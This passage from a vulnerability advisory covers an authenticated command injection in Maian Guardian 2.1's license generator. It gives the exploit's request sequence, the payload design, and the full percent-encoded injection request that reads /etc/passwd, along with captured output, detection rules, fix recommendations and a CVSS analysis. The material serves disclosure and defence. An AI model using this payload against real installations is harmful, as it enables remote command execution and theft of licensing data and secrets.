                                                            "status":"ok" in the JSON body
3      GET  /admin/index.php?p=settings                      re-read a freshly rendered CSRF
                                                            token from an authenticated page
4      POST /admin/index.php?ajax-ops=generate               deliver the injection in projid
       body: licfile, projid=$(...), projkey, licpath,        and satisfy the handler's
             key[]=a, value[]=b, cs_rf                        presence and count() checks
       header: csrf
5      GET  /<marker-dir>/mg_rce_proof_<rand>.txt            read the execution proof back
                                                            over HTTP
6      POST /admin/index.php?ajax-ops=generate               optional: with --cleanup, inject
       body: projid=$(rm -f <marker-abs-path>)                removal of our own marker only
```

Step order matters in one specific way. The token rendered on the login page is consumed by the login request; step 3 therefore exists purely to harvest a second, post-authentication token, because the product rotates the token per page render and reusing a stale value would fail the `CSRF_POST_VAL` check in step 4. Both the `cs_rf` body field and the `csrf` header are sent on every POST, matching what the product's own JavaScript does, so the exploit does not depend on which of the two acceptance paths in `control/tokens.php:26-41` the operation consults.

Success criteria are deliberately not taken from the generate response. The script treats the injection as delivered when step 4 answers HTTP 200, and it treats execution as proven only when step 5 returns HTTP 200 with a non-empty body that contains the expected marker string. If the marker is not readable, the script reports that distinction explicitly and exits with a separate code, because "the request was accepted" and "the command ran" are different claims and an honest tool must not conflate them. The script documents the reason in its own output: on a hardened deployment the service account may lack write access to the document root, in which case the injection still executes but the proof has to be taken out of band, through a DNS or HTTP callback or a path the auditor can otherwise read.

### Exploit Construction — payload engineering constraints

The payload is a command-substitution wrapper written to survive four specific constraints of this chain.

The first constraint is quoting context. The value is embedded by `lock()` inside double quotes, so the obvious metacharacters are dead ends: a `;`, `|`, `&` or newline inside double quotes is a literal character of the argument, not a command separator. Command substitution `$()` and backticks are the expansions the shell still performs inside double quotes, so `$(...)` is the primitive. No quote breakout is needed for `projid`, which keeps the payload simpler than it would be for the property fields.

The second constraint is where redirection may appear. Writing the output to a file requires `>` and a path, but at the top level those characters are inside the double-quoted argument and would be passed to the generator binary as text. Inside the `$()` subshell they are parsed normally by that subshell. Every command in the payload therefore carries its own redirection inside the substitution.

The third constraint is transport encoding. The body is `application/x-www-form-urlencoded`, so the payload travels percent-encoded: `$` as `%24`, `(` and `)` as `%28` / `%29`, `>` as `%3E`, `;` as `%3B`, `/` as `%2F`, and spaces as `+`. The recorded request line from our run shows the encoded form directly, and reproducing it by hand without encoding is the most common way to see this fail.

The fourth constraint is a PHP 8 behaviour in the handler, not a defence. `key[]` and `value[]` must be present, because the handler counts the property arrays and `count()` on a non-array raises a `TypeError` under PHP 8, aborting the operation before the object is constructed. The exploit sends `key[]=a&value[]=b`, which yields a count of one and keeps the chain intact.

With those constraints the shipped payload shape is:

```
projid = $(id > <abs-marker-path>; echo MG_RCE_CONFIRMED >> <abs-marker-path>;
           whoami >> <abs-marker-path>; hostname >> <abs-marker-path>;
           uname -a >> <abs-marker-path>; <command> >> <abs-marker-path> 2>&1)
```

Five fixed reconnaissance commands bracket the operator-supplied command, and `2>&1` on the last one routes stderr into the same file so a failing command is visible as an error message rather than as silence. The proof file is placed under the document root so it can be fetched over HTTP, which is what turns a blind injection into a self-evidencing one. The marker directory defaults to the product's own `content` tree, since that directory is part of a normal installation and is writable by the service account in the shape we tested.

### Exploit Construction — what the exploit deliberately does not do

- It ships no payload beyond identity reconnaissance and an operator-supplied command. The default command is `id`; there is no webshell, no bind shell, no reverse shell, no downloader, no cron alteration, no user creation and no log deletion anywhere in the script.
- It writes exactly one file on the target — its own uniquely named marker — and with `--cleanup` it removes exactly that file using the same channel. It never touches product files, license files, database contents or configuration.
- It holds no credentials. The password is a required command-line argument with no default, and no target host, port, path or credential is baked into the script. The default target is loopback.
- It does not attempt to bypass authentication, the CSRF gate, or the remote API key. It logs in with credentials it is given.
- It does not claim success from the HTTP status of the generate request. Without a readable marker it reports an inconclusive result rather than a confirmed one.
- It does not enumerate other license fields. Six additional tainted inputs exist on the same sink; the exploit exercises the one that was verified, and does not advertise the others as working.

## 9. Dynamic Verification

### Dynamic Verification — environment

The verified run used a two-container installation of the product on a research host, with the HTTP listener bound to loopback:

| Property | Value |
|---|---|
| Product | Maian Guardian 2.1, installed through its own install wizard |
| PHP tier | stock PHP 8.3 Apache image with the zip extension |
| Database tier | MySQL 8 in a second container, private bridge network |
| Listener | HTTP on the loopback interface of the host only |
| Administrator credential | set by the install wizard to a strong password chosen for this engagement; not a product default, and not reproduced here |
| `guard_settings.licpath` | `/bin/echo`, a stand-in for the SourceGuardian generator binary |
| `ENC_DEBUG` | `0`, the shipped value; selects the `shell_exec()` branch of `create()` |
| `SECRET_KEY` / remote API key | generated randomly by the installer, as shipped |
| Document root | writable by the service account in this deployment shape |

Three of these are our configuration choices rather than product behaviour and are called out as such: the loopback binding, the choice of administrator password, and the `/bin/echo` stand-in for the generator binary. The stand-in is the important one. It exists because the genuine SourceGuardian generator is separately licensed and we did not possess it, and it is defensible because command substitution is evaluated during argument expansion, before the command word is resolved — the placeholder cannot suppress the injection. What it does mean is that a license file was never actually produced in our run, and a verification against a production installation carrying the real generator binary was not performed. An earlier iteration of the same chain wrote its marker outside the document root and was confirmed there before the HTTP read-back path was exercised, which is why we state write capability both inside and outside the web tree as observed rather than assumed.

### Dynamic Verification — the triggering request

The request that fired the injection, with the target host header generalised and the payload shown in the percent-encoded form the wire actually carried:

```
POST /admin/index.php?ajax-ops=generate HTTP/1.1
Host: <target>
Cookie: PHPSESSID=<session>
csrf: <token>
Content-Type: application/x-www-form-urlencoded

licfile=audit_65869e8c.lic&projid=%24%28id+%3E+%2Fvar%2Fwww%2Fhtml%2Fcontent%2Fmg_rce
_proof_65869e8c.txt%3B+echo+MG_RCE_CONFIRMED+%3E%3E+%2Fvar%2Fwww%2Fhtml%2Fcontent%2Fmg_
rce_proof_65869e8c.txt%3B+whoami+%3E%3E+...%3B+hostname+%3E%3E+...%3B+uname+-a+%3E%3E+
...%3B+cat+%2Fetc%2Fpasswd+%7C+head+-3+%3E%3E+...+2%3E%261%29&projkey=x
&licpath=--domain+example.com&key%5B%5D=a&value%5B%5D=b&cs_rf=<token>
```

Two earlier requests precede it and one follows. The login request:

```
POST /admin/index.php?ajax-ops=login HTTP/1.1
Host: <target>
Cookie: PHPSESSID=<session>
csrf: <token>
Content-Type: application/x-www-form-urlencoded

usr=<administrator>&pw=<supplied-on-the-command-line>&cs_rf=<token>
```

answered HTTP 200 with a body containing `"status":"ok"`, establishing the administrator session. A subsequent authenticated `GET /admin/index.php?p=settings` answered HTTP 200 and supplied the fresh CSRF token used above. The `generate` request answered `HTTP 200` with the operation's ordinary JSON body `{"status":"rdr",...}` — its normal response shape when the generator produced no valid license file, which is exactly what a placeholder binary does. Finally, `GET /content/mg_rce_proof_65869e8c.txt` answered HTTP 200 with 266 bytes of proof.

The gap between a routine-looking 200 response and six executed commands is the operationally interesting property of this run: at the application-log level this request is indistinguishable from an administrator issuing a license.

### Dynamic Verification — observed output

The exploit's own stdout from the verified run, reproduced verbatim except that the loopback target address and the marker suffix are the values that run used:

```
[*] Target: http://127.0.0.1:8766
[*] Authenticated as admin user: <administrator> (custom strong password, non-default)
[*] Step 1: fetching admin login page + CSRF token ...
[+] Login successful (admin session established).
[*] Step 2: fetching fresh CSRF token from admin dashboard ...
[+] CSRF token acquired.
[*] Step 3: triggering command injection via generate AJAX (projid field) ...
[*] Injected command: cat /etc/passwd | head -3
[*] generate HTTP status: 200
[*] Step 4: reading back proof marker over HTTP (content/mg_rce_proof_65869e8c.txt) ...
[+] RCE CONFIRMED. Command output captured over HTTP:
------------------------------------------------------------
uid=33(www-data) gid=33(www-data) groups=33(www-data)
MG_RCE_CONFIRMED
www-data
<hostname-elided>
Linux <hostname-elided> 5.10.134-19.2.al8.x86_64 #1 SMP x86_64 GNU/Linux
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
------------------------------------------------------------
[+] Proof marker URL: http://127.0.0.1:8766/content/mg_rce_proof_65869e8c.txt
[+] Privilege: web server user (www-data / apache uid).
[+] Vulnerability: CWE-78 command injection in license generator shell_exec.
```

The container hostname and the kernel build-timestamp field of the `uname -a` line have been elided here; every other field is as recorded. The target-side artefact was the same file read inside the container: `/var/www/html/content/mg_rce_proof_65869e8c.txt`, 266 bytes, owned by `www-data`. HTTP read-back and target-side inspection agree byte for byte, so the proof does not rest on the web server serving something we cannot otherwise see.

What each line proves:

| Observed line | Proves |
|---|---|
| `uid=33(www-data) gid=33(www-data) groups=33(www-data)` | the execution identity is the web server service account — full uid, gid and supplementary group list, not root |
| `MG_RCE_CONFIRMED` | the injected `echo` ran, so the substitution executed our text rather than passing it through |
| `www-data` | `whoami` ran and agrees with `id` |
| the hostname and `uname -a` line | `hostname` and `uname` ran — different binaries, different argument counts |
| the three `/etc/passwd` lines | the operator-supplied command ran, through a pipeline (`|`) and a truncation (`head -3`), proving the injected text is parsed as shell syntax and not as a single fixed command |
| 266 bytes written inside the document root, owned by the service account | the achieved identity can create files the web server will then serve, which is the persistence property discussed in section 10 |

Six distinct commands, including one pipeline, all producing their own output in one file, is what separates arbitrary command execution from a single hard-coded effect. The kernel line additionally shows the container's guest kernel, confirming the commands ran on the target host's namespace rather than anywhere in the tooling that sent them.

### Dynamic Verification — the negative control and why it matters

A command-injection proof that only shows "a file appeared" invites one obvious objection: maybe the product wrote that file itself. The published exploit therefore carries a `--control` mode. It performs the identical authenticated sequence — same login, same fresh CSRF token, same `generate` operation, same field set, including a non-empty `licpath` and the `key[]` / `value[]` pair — but substitutes a benign project identifier and project key, and points its read-back at a marker name it never injects. It then asserts that the marker URL does not answer, and reports the assertion result rather than leaving it implied.

What a passing control rules out: that the proof file pre-existed, that the `generate` operation writes arbitrary attacker-named files into the document root as a normal side effect, that the read-back URL is served by something other than the written file, and — taken together with the fact that six different commands produced output — that anything other than shell expansion of our text explains the marker's contents.

Where the control is honest about its own status: the archived verification output quoted above is the injection leg of the run, and the control leg is shipped in the exploit so that any reader can execute it against their own instance. We do not present a recorded control transcript in this advisory because we did not archive one, and inventing one would be worse than saying so. The structural half of the control does come from source: the only thing on this path that creates a file inside the document root is the shell command assembled at `class.licensing.php:261`, and no branch of the `generate` operation writes to `content/` on its own.

### Dynamic Verification — boundaries of what was verified

- Verified by execution: injection through the `projid` field of the `generate` AJAX operation, command execution as `uid=33(www-data)`, multi-command execution including a pipeline, file creation inside and outside the document root, and HTTP read-back of that file.
- Established by source reading only: the six additional tainted fields on the same sink, the remote API entry point into the same class, and the assertion that expansion fires even when the generator path is empty or the binary is absent.
- Not tested at all: a production installation carrying the genuine SourceGuardian generator binary; a hardened deployment where the service account cannot write to the document root; any non-administrator or buyer-facing principal attempting the same operation; any privilege escalation beyond the service account; the remote API key gate under attack.
- Not established: whether the `generate` operation is role-restricted among `guard_staff` accounts in a multi-user deployment. Our review found no role model that separates it, and no evidence of a lower-privileged principal reaching it. This is the reason `PR:H` is published and `PR:L` is treated as a rejected reading in section 12.
- One version only: 2.1. Earlier or later releases were not obtained and are not covered by any statement here.

## 10. Reachability and Security Impact

### Reachability and impact — network position

The chain is fully remote over HTTP. Three requests and one read-back, all TCP to the product's single listener; no local access, no man-in-the-middle position, no adjacent-network requirement, no physical presence and no second protocol. The loopback binding in our testbed was a property of the research host, not of the product — a customer installing Guardian exposes it on whatever address their deployment uses, typically a public HTTPS endpoint, since the whole point of the product is to issue licenses to remote encoded applications.

That matters for the metric: `AV:N` describes the product's exposure, not our lab's. An attacker needs network reachability to the web application and a valid administrator session. Nothing else about the environment participates.

### Reachability and impact — what the achieved identity controls

The achieved identity is the web server service account on a licensing server. Separating what we observed from what follows structurally:

Observed in the verified run:
- Arbitrary command execution, including pipelines, as `uid=33(www-data)`.
- Reading a world-readable system file (`/etc/passwd`).
- Creating files inside the document root, owned by the service account, and having the web server serve them — which is a persistence primitive, since a `.php` file placed there is executed on request in the tested shape.

Follows from the same identity on this product, argued rather than demonstrated in the recorded run:
- The PHP process must be able to read `control/_cfg.php`, so an attacker running as that identity can read the database credentials (`DB_HOST`, `DB_USER`, `DB_PASS`, `DB_NAME`), the `SECRET_KEY`, and the installer-provisioned `LG_USER` / `LG_PASS` values held there.
- Holding `SECRET_KEY` is more damaging than it looks, because the administrator session value is `SECRET_KEY` concatenated with a timestamp. An attacker who reads it can mint a valid `guardian_access` session without any password at all, which converts one administrator compromise into durable, credential-independent access.
- Full read and write access to the licensing database follows from those credentials: license records, project identifiers and keys, buyer identities and contact data, product inventory, and staff rows in `guard_staff`. On a licensing server that is the crown jewel — an attacker can issue valid licenses for the vendor's customers' encoded products, revoke or alter existing ones, and harvest the buyer list.
- Reading the remote API key from the `guard_settings` table gives the attacker the second door into this same sink, usable by any encoded product or script that speaks the API.
- Encoded product artefacts staged on the server for licensing are readable and rewritable by the same account.

Not reached and not claimed: the host. The container had no obvious route to elevated privilege — no setuid helper on the path, no writable scheduled-task directory — and we did not attempt escalation. There is no root in this advisory, the directory name does not claim it, and the impact ceiling is what the service account owns. Where that ceiling bites hardest is the licensing data and the ability to plant a persistent interpreter-executed file in the document root.

### Reachability and impact — the unauthenticated question, answered in full

We pursued the unauthenticated variant and it is not available. The enumeration behind that statement:

- Approximately sixty-two interfaces were inventoried by three independent methods that agreed.
- Approximately nine of them answer without credentials: four static asset trees, the buyer portal front page and its license-lookup operation, the remote API endpoint refusing a keyless request, the post-installation installer route, and the login operation itself.
- Zero of those nine reach a command-execution, deserialization or file-write sink. The static trees never enter the interpreter. The buyer portal's database paths are parameterised in our review. The installer directory is renamed after installation.
- Every parameter of every unauthenticated interface was tested for traversal, injection, type confusion, over-long input and encoding bypass. None reached a sink.
- The administrator gate was attacked through eight candidate bypasses and held on all eight (section 3).
- The remote API key is randomly generated at install and was not obtained; the comparison was not broken.

So the honest classification is authenticated remote code execution with an administrator session, and the score in section 12 reflects that. This is not a case of a weak gate being discounted; the gate is the only reason the finding is `PR:H`.

One nuance is worth stating for operators rather than for scorers: the buyer-facing write channel does not exist, but the document root does. Because our injection writes a file the web server will serve and execute, an authenticated administrator compromise becomes visible to unauthenticated visitors afterwards — the persisted artefact, not the injection, is what an outsider later touches.

### Reachability and impact — detection notes

- The triggering request is an ordinary administrator operation. In a default combined-format access log it appears as `POST /admin/index.php?ajax-ops=generate` with no payload detail, because request bodies are not logged. The percent-encoded `$(` and `)` live in the body, not the URL.
- The operation answered HTTP 200 with `{"status":"rdr"}`. There is no error status, no 4xx or 5xx, and no application-level alert to correlate on.
- The child process is spawned by the PHP worker, so on the host it appears as `/bin/sh -c ...` descended from the web server, which is unusual for this product: Guardian's normal generation path invokes the SourceGuardian generator binary, not a shell whose argument list contains redirections and semicolons.
- A concrete detection rule that would have caught our run: alert on any `generate` request whose body contains `%24%28` or `$(`. It is narrow, cheap, and specific to this product's one legitimate shell-out.
- File-integrity monitoring on the document root, specifically the `content` tree, would flag the marker; a new interpreter-executable file there owned by the service account is anomalous regardless of this vulnerability.
- The `guardian_access` session value derives from `SECRET_KEY` plus a timestamp, so a session forged after a configuration read will not correspond to any login request in the logs. Absence of a login for an active administrator session is a high-signal indicator here.
- If the deployment uses the genuine generator binary, a successful injection may coincide with a valid license file being produced, making the request look entirely legitimate from the application's own audit trail.

## 11. Fix Recommendations

### Fix Recommendations — vendor-side, ordered by root cause

1. Stop assembling shell strings. Replace the `shell_exec()` call at `control/classes/class.licensing.php:261` with an argument-vector invocation — `proc_open()` given an array, where the generator path is element zero and each option and value is its own element. No shell is then spawned, quoting becomes irrelevant, and the entire class of defect disappears rather than being defended field by field. This is the correct root-cause fix and every other item below is a step towards it.
2. If a shell invocation must remain, quote every interpolated value with `escapeshellarg()` — including the license path itself, which is currently wrapped in literal double quotes by `mswSGLicGenPath()`. Concretely, `class.licensing.php:112-113` should become `--projid` and `escapeshellarg($this->projid)` as separate words, not one interpolated string.
3. Delete the no-op `escape()` and the no-op `mswCD()`. A function named `escape()` that returns its argument is an active hazard: it defeats review by its presence and it will be re-trusted by the next contributor. If a wrapper is wanted, point every call site at the already-written `escapeArg()` and make `escape()` unavailable.
4. Stop shipping dead security code. `escapeArg()` at `class.licensing.php:72-74` wraps exactly the right primitive and has no call site. Either call it or remove it; its current state suggests a completed remediation that never landed.
5. Validate the license-generation fields against a character allow-list at the handler. `projid` and `projkey` are SourceGuardian project identifiers, so an alphanumeric constraint plus a length cap is sufficient and matches the validation the product already applies to the staff `user` field at `admin/control/system/_ajax.php:432`. Apply the same rule to property keys and values, the encoder string, `hblock`, `timeservers` and `expire_in`.
6. Validate the configured generator path before use: resolve it, require it to be an existing regular file and executable, and require its basename to match the expected generator. This removes the placeholder-path exposure and prevents the settings field from being used to point the shell at an arbitrary binary.
7. Fix the API path at the same time. `control/api/api-remote.php:136-154` constructs the same class from its own parameters; a patch limited to the administrator AJAX operation leaves the sink reachable through the API.
8. Harden the remote API key comparison, as a separate change from the injection fix: compare the raw configured key with `hash_equals()` rather than comparing unsalted MD5 digests with `==`. This is defence in depth for the second door to the sink, not a fix for the injection.
9. Remove privilege from the service account where the product does not need it: run the generator as a distinct unprivileged user, keep license output outside the document root, and document a read-only document root for the web tier. Nothing in Guardian requires an interpreter-writable `content` tree.
10. Ship a regression test. Assert that a `projid`, `projkey` or property value containing `$(`, a backtick, a double quote, `;`, `|` or `&` is either rejected outright or survives to the child process as literal text, and assert that no child process is spawned at all when validation rejects the request. Without a test, item 3's deletion will be re-broken by the next refactor.

### Fix Recommendations — operator-side, until a patch exists

1. Restrict who holds administrator credentials, and treat them as equivalent to shell access on the licensing host. Every administrator of Guardian 2.1 can, by design of this defect, run commands as the web server user.
2. Remove network exposure that is not needed. Serve the administration back-end only from a management network or through an authenticated reverse proxy or VPN, so that the vulnerable operation is not reachable from the internet.
3. Make the document root read-only for the service account and relocate license output outside the web tree. This does not stop execution but it removes the persistence primitive and the HTTP read-back channel we used for proof.
4. Run the PHP tier in a minimally privileged container or under a dedicated service account with no access to anything else on the host, and drop unnecessary capabilities. Assume the account is compromised when sizing what it can reach.
5. Enable file-integrity monitoring on the document root, particularly the `content` tree, and alert on new interpreter-executable files owned by the web server account.
6. Add a web-application firewall or reverse-proxy rule that rejects `generate` requests whose body contains `$(` or its percent-encoded form `%24%28`. It is a narrow rule and a stopgap; it will not survive a change of injection field, but it raises the cost of the trivially automated version of this attack.
7. Audit administrator sessions against login events. A `guardian_access` session with no corresponding login request indicates that `SECRET_KEY` has been read and sessions are being forged.
8. Rotate `SECRET_KEY`, the remote API key, the administrator credentials and the database credentials if there is any suspicion of compromise, and assume license and buyer data readable by the service account was exposed. Note that rotating `SECRET_KEY` invalidates existing sessions, which is the point.
9. Ask the vendor for a patched release and confirm which of the two entry points — the administrator AJAX operation and the remote API — the patch covers before treating the exposure as closed.

## 12. CWE and CVSS

### CWE and CVSS — classification

Primary: CWE-78, Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection'). The product builds a command string from externally influenced input and passes it to a shell without neutralising the elements that the shell interprets.

Contributing, all inside the same defect:
- CWE-116, Improper Encoding or Escaping of Output — the escaping step on the path to the shell is present in name and absent in effect.
- CWE-20, Improper Input Validation — no allow-list, length cap or metacharacter rejection is applied to any of the seven tainted fields.
- CWE-561, Dead Code — `escapeArg()`, the one correct primitive, is defined and never called.
- CWE-250 / CWE-732 — the generator is invoked with the web server's own identity and the document root is writable by that identity, which is what turns execution into persistence. These are environmental amplifiers of the same event, not separate findings.

Reported separately and explicitly not folded into the score: the remote API key comparison hashes both sides with unsalted MD5 and compares with `==`. That is CWE-328 (use of a weak hash) with a CWE-208 (observable timing discrepancy) aspect. It is a hardening observation about a different authentication path, it was not demonstrated to be exploitable, and it does not appear in the vector below. Mixing it into the command-injection rating is exactly the error this section exists to avoid.

### CWE and CVSS — vector derivation

Published vector, computed from first principles with the CVSS 3.1 base formula:

```
CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H

AV:N   0.85  -- three HTTP requests against one network listener; the loopback
                binding in our testbed is our own, not a product property
AC:L   0.77  -- one POST, no race, no unusual state; the only settings involved
                are ones a functioning installation already has
PR:H   0.27  -- an administrator session is required and was the only principal
                demonstrated; Scope Unchanged weight table
UI:N   0.85  -- no user interaction; the attacker's own session drives it
S:U           -- see the Scope decision below
C:H    0.56  -- arbitrary command execution as the service account reads every
                file that account can read: configuration including database
                credentials and SECRET_KEY, license records, buyer data
I:H    0.56  -- that identity writes into the document root (observed) and can
                rewrite licensing data and application files
A:H    0.56  -- the same identity can corrupt or remove licensing data and
                application files, destroying the server's function
```

Arithmetic, with Scope Unchanged:

```
ISS        = 1 - ((1-0.56) * (1-0.56) * (1-0.56)) = 0.914816
Impact     = 6.42 * 0.914816                     = 5.87311872
Exploitab. = 8.22 * 0.85 * 0.77 * 0.27 * 0.85    = 1.234707705
Base       = min(5.87311872 + 1.234707705, 10)   = 7.107826425
Roundup    = ceil(7.107826425 * 10) / 10         = 7.2   (High)
```

Two metric decisions carry the whole weight of the score and are argued rather than assumed.

`PR:H` and not `PR:L`. The sink was reached with an administrator session and only with an administrator session. The product does keep a `guard_staff` table for multiple accounts, so a deployment could in principle contain a less privileged operator, but our review found no role or permission construct that separates license generation from any other administrator operation, and no evidence that a non-administrator staff account can reach `generate`. Publishing `PR:L` would rest on an unstudied possibility rather than on a demonstrated principal, so the lower reading is rejected and printed below instead.

`AC:L` and not `AC:H`. Nothing outside the attacker's control is required beyond a configuration that any working installation already has. The `ENC_DEBUG` value is the shipped one, and the license-generator path is a setting the product cannot function without; our run used a placeholder that does not even resolve to the real generator. The POST-side `licpath` field is attacker-supplied. We did count the documented preconditions rather than arguing them away — and they still leave the conditions inside the attacker's or the normal deployment's control, which is what `AC:L` means.

### CWE and CVSS — the Scope decision

Scope is Unchanged. The vulnerable component is the Guardian PHP application, and the component that is impacted is reached through the identity that application already runs as, on the same host, inside the same trust boundary it was given at install time. Executing as the service account gives an attacker the data the application itself already owns — licenses, buyers, product inventory — and write access to a document root that the application routinely writes to. No second authorization boundary is crossed to a component that is not already under this principal's control, and no cross-machine or cross-account outcome was demonstrated. A command-execution defect that hands an attacker its own process's identity and its own process's files is a Scope Unchanged event.

The Scope Changed reading is printed and rejected rather than hidden:

```
AV:N/AC:L/PR:H/UI:N/S:C/C:H/I:H/A:H
ISS        = 0.914816
Impact     = 7.52 * (0.914816 - 0.029) - 3.25 * (0.914816 * 0.9731 - 0.02) ** 13 = 6.128026329
Exploitab. = 8.22 * 0.85 * 0.77 * 0.50 * 0.85 = 2.28649575
Base       = min(1.08 * (6.128026329 + 2.28649575), 10) = 9.087683845
Roundup    = 9.1
```

It is rejected because the argument for it would be "the application escaped to the operating system", and on this host the application's operating-system identity is the same one that owns everything the application owns. We did not demonstrate impact on a component outside that identity — no host takeover, no other tenant, no other service — so `S:C` would be rating an outcome the evidence does not contain. Had we demonstrated pivot to another machine or another account, `S:C` would be the right call and the score above would be the right number.

### CWE and CVSS — what is deliberately not published

Readings we considered and rejected, each printed with its own vector so the arithmetic is inspectable:

| Reading | Vector | Computes to | Why rejected |
|---|---|---|---|
| Unauthenticated | `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` | 9.8 | The unauthenticated surface reaches no sink; the administrator gate held under eight bypass candidates. Nothing in the evidence supports `PR:N` |
| Lower-privileged operator | `AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H` | 8.8 | No role-separated principal was demonstrated reaching `generate`; the `guard_staff` table's role model was not established. Would be defensible only with evidence we do not have |
| Scope Changed | `AV:N/AC:L/PR:H/UI:N/S:C/C:H/I:H/A:H` | 9.1 | No component outside the service account's own authority boundary was impacted |

Also deliberately not published:

- No root claim. The identity reached is `uid=33(www-data)` and no escalation was attempted. The directory and title of this advisory say so.
- No default-credential amplifier. The product has no factory credential, so no `PR:N` argument can be built from unrotated defaults, and we do not borrow one from a different product family.
- No score contribution from the weak API key comparison. It is a hardening note with its own CWE class, priced at zero.
- No score contribution from the six additional tainted fields or the remote API entry point. They widen the patch surface a vendor must cover; they do not change how hard the demonstrated injection is to perform.
- No correction notice. Our own notes carry no numeric CVSS value for this finding, so there is no recorded score that disagrees with a vector. The 7.2 above is derived from the vector in this section and nothing else.

### CWE and CVSS — summary

Maian Guardian 2.1 contains an OS command injection (CWE-78) in the license-generation routine at `control/classes/class.licensing.php:261`, reachable by an authenticated administrator through `POST /admin/index.php?ajax-ops=generate`. The root cause is a shipped escaping function that returns its input unchanged, alongside a correct escaper that is defined and never called. The verified outcome is arbitrary command execution as `uid=33(www-data)`, with write access to the document root and, by extension from the same identity, to the licensing database and the configuration secrets that let an attacker forge administrator sessions. Published rating:

```
CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H  =  7.2  (High)
CWE-78 primary; CWE-116, CWE-20, CWE-561, CWE-250/CWE-732 contributing
CWE-328 and CWE-208 reported separately for the API key comparison, unscored
```

Seven tainted fields and two entry points reach this one sink. A patch that only guards the administrator AJAX operation, or only guards `projid`, leaves the rest of it in place.
